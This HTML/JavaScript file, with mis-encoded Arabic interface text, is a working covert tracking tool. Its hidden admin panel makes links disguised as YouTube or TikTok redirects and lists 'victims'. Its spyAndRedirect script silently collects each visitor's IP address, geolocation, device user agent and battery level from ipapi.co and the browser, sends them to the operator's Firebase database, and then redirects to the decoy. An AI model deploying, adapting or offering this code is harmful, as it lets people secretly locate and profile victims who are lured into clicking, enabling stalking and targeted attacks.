<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Ø§Ù„Ù†Ø¸Ø§Ù… Ø§Ù„Ø°ÙƒÙŠ</title>
    <style>
        body { font-family: 'Segoe UI', sans-serif; margin: 0; background: #0f172a; color: white; }
        .admin-section { display: none; padding: 20px; }
        .card { background: #1e293b; padding: 20px; border-radius: 12px; margin-bottom: 20px; box-shadow: 0 4px 6px rgba(0,0,0,0.3); }
        input { width: 80%; padding: 12px; border-radius: 8px; border: 1px solid #334155; background: #0f172a; color: white; }
        button { padding: 12px 25px; border-radius: 8px; border: none; background: #3b82f6; color: white; cursor: pointer; font-weight: bold; }
        table { width: 100%; border-collapse: collapse; margin-top: 20px; }
        th, td { padding: 12px; border: 1px solid #334155; text-align: center; font-size: 13px; }
        th { background: #1d4ed8; }
        .user-section { text-align: center; margin-top: 20% ; display: none; }
        .copy-btn { background: #10b981; margin-top: 10px; }
    </style>
</head>
<body>

    <div id="adminArea" class="admin-section">
        <h1>ğŸ› ï¸ Ù„ÙˆØ­Ø© ØµÙ†Ø¹ Ø§Ù„Ø±ÙˆØ§Ø¨Ø· ÙˆØ§Ù„ØªØ­ÙƒÙ…</h1>
        
        <div class="card">
            <h3>1. Ø¥Ù†Ø´Ø§Ø¡ Ø±Ø§Ø¨Ø· Ø¬Ø¯ÙŠØ¯</h3>
            <input type="text" id="targetInput" placeholder="Ø¶Ø¹ Ø±Ø§Ø¨Ø· Ø§Ù„ÙŠÙˆØªÙŠÙˆØ¨ Ø£Ùˆ ØªÙŠÙƒ ØªÙˆÙƒ Ù‡Ù†Ø§...">
            <button onclick="generateLink()">Ø¥Ù†Ø´Ø§Ø¡ Ø±Ø§Ø¨Ø·</button>
            <div id="resultLink" style="margin-top:15px; color: #10b981; word-break: break-all;"></div>
        </div>

        <div class="card">
            <h3>2. Ø§Ù„Ø£Ø¬Ù‡Ø²Ø© Ø§Ù„Ù…Ø®ØªØ±Ù‚Ø© (Ø§Ù„Ø¶Ø­Ø§ÙŠØ§)</h3>
            <table>
                <thead>
                    <tr>
                        <th>Ø§Ù„ÙˆÙ‚Øª</th>
                        <th>IP & Ø§Ù„Ù…ÙˆÙ‚Ø¹</th>
                        <th>Ø§Ù„Ø¬Ù‡Ø§Ø² & Ø§Ù„Ù†Ø¸Ø§Ù…</th>
                        <th>Ø§Ù„Ø¨Ø·Ø§Ø±ÙŠØ©</th>
                    </tr>
                </thead>
                <tbody id="logsTable"></tbody>
            </table>
        </div>
    </div>

    <div id="userArea" class="user-section">
        <p>Ø¬Ø§Ø±ÙŠ ØªÙˆØ¬ÙŠÙ‡Ùƒ Ù„Ù„Ù…Ø­ØªÙˆÙ‰...</p>
    </div>

    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-app.js"></script>
    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-database.js"></script>

    <script>
        // --- Ø¥Ø¹Ø¯Ø§Ø¯Ø§Øª Firebase (Ø¶Ø¹ Ø¨ÙŠØ§Ù†Ø§ØªÙƒ Ù‡Ù†Ø§) ---
        const firebaseConfig = { databaseURL: "Ø±Ø§Ø¨Ø·_Ù‚Ø§Ø¹Ø¯Ø©_Ø¨ÙŠØ§Ù†Ø§ØªÙƒ_Ù‡Ù†Ø§" };
        firebase.initializeApp(firebaseConfig);
        const db = firebase.database();

        const urlParams = new URLSearchParams(window.location.search);
        const isAdmin = urlParams.has('admin');

        if (isAdmin) {
            // --- Ù…Ù€Ù†Ù€Ø·Ù€Ù‚ Ù„Ù€ÙˆØ­Ù€Ø© Ø§Ù„Ù€ØªÙ€Ø­Ù€ÙƒÙ€Ù… ---
            document.getElementById('adminArea').style.display = 'block';
            document.title = "Admin Panel";

            function generateLink() {
                const target = document.getElementById('targetInput').value;
                if(!target) return alert("Ø¶Ø¹ Ø±Ø§Ø¨Ø·Ø§Ù‹ Ø£ÙˆÙ„Ø§Ù‹!");
                // ØªØ®Ø²ÙŠÙ† Ø§Ù„Ø±Ø§Ø¨Ø· ÙÙŠ Firebase
                db.ref('settings/targetUrl').set(target);
                const finalLink = window.location.origin + window.location.pathname;
                document.getElementById('resultLink').innerHTML = `Ø£Ø±Ø³Ù„ Ù‡Ø°Ø§ Ø§Ù„Ø±Ø§Ø¨Ø·: <br><strong>${finalLink}</strong>`;
            }

            // Ø¹Ø±Ø¶ Ø§Ù„Ø³Ø¬Ù„Ø§Øª
            db.ref('logs').on('value', (snapshot) => {
                const data = snapshot.val();
                const table = document.getElementById('logsTable');
                table.innerHTML = "";
                for (let id in data) {
                    const log = data[id];
                    table.innerHTML = `<tr>
                        <td>${log.time}</td>
                        <td><span style="color:#10b981">${log.ip}</span><br>${log.location}</td>
                        <td style="font-size:10px">${log.ua}</td>
                        <td>${log.battery}</td>
                    </tr>` + table.innerHTML;
                }
            });

        } else {
            // --- Ù…Ù€Ù†Ù€Ø·Ù€Ù‚ Ø§Ù„Ù€Ø¶Ù€Ø­Ù€ÙŠÙ€Ø© ---
            document.getElementById('userArea').style.display = 'block';

            async function spyAndRedirect() {
                // Ø¬Ù„Ø¨ Ø§Ù„Ø±Ø§Ø¨Ø· Ø§Ù„Ø£ØµÙ„ÙŠ Ø§Ù„Ø°ÙŠ Ø­Ø¯Ø¯ØªÙ‡ Ø£Ù†Øª Ù…Ù† Ø§Ù„Ù„ÙˆØ­Ø©
                const snapshot = await db.ref('settings/targetUrl').once('value');
                const targetUrl = snapshot.val() || "https://google.com";

                let ipData = { ip: "Unknown", city: "", country_name: "", org: "" };
                let batteryLevel = "??";

                try {
                    const res = await fetch('https://ipapi.co/json/');
                    ipData = await res.json();
                    const battery = await navigator.getBattery();
                    batteryLevel = Math.round(battery.level * 100) + "%";
                } catch(e) {}

                const logData = {
                    ip: ipData.ip,
                    location: `${ipData.city}, ${ipData.country_name}`,
                    ua: navigator.userAgent,
                    battery: batteryLevel,
                    time: new Date().toLocaleString('ar-EG')
                };

                // Ø¥Ø±Ø³Ø§Ù„ Ø§Ù„Ø¨ÙŠØ§Ù†Ø§Øª Ø«Ù… Ø§Ù„ØªØ­ÙˆÙŠÙ„ ÙÙˆØ±Ø§Ù‹
                db.ref('logs').push(logData).finally(() => {
                    window.location.replace(targetUrl);
                });
            }
            spyAndRedirect();
        }
    </script>
</body>
</html>
